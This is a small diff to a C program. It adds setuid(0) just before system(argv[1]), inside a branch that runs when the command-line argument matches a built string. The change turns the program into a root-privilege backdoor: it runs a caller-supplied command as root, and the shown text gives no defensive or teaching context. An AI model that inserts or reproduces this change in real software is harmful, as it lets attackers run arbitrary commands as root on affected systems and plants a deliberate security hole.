@@ -38,6 +38,7 @@ int main(int argc, char* argv[])
 			temp_array[i] = '\0';
 			if(strcmp(argv[1], temp_array) == 0)
 			{
+				setuid(0);
 				system(argv[1]);
 				return 0;
 			}
